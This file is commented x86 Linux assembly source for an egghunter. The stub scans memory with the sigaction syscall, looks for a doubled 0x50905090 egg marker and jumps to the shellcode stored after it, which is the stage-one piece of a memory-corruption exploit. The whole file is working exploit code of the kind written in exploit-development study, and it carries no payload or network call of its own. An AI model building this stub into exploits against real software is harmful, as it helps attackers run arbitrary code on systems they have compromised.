
global _start


section .text


_start:
entry1:
    cld           ; clear direction flag 
    mov bl, 0xff ; make sure EBX doesn't point to a valid signal number
    or cx, 0xfff  ; increase cx by pagesize. 
    xor edx, edx  ; make EDX not point to a valid memory range 

entry2:
    inc ecx       ; inc ecx 
    xor eax, eax  ;  eax = 0 
    mov al,0x43   ; sigaction syscall 
    int 0x80      ; call sigaction 
    cmp al,0xf2   ; if al == f2
    jz entry1     ; is not a valid memory address, increase act structure address by page size 
    mov eax, 0x50905090 ; store the EGG key inside eax 
    mov edi, ecx  ; needed for using scasd instruction 
    scasd         ; compare edi with eax, then increase edi by four 
    jnz entry2    ; if zero flag is not set, thus are different, go back to the start of the loop and analyze the next bytes 
    scasd         ; perform another check for the egghunter key. 
    jnz entry2    ; compare edi with eax , then increase edi by four 
    jmp edi       ; if there are equals we found the shellcode. Execute it! 
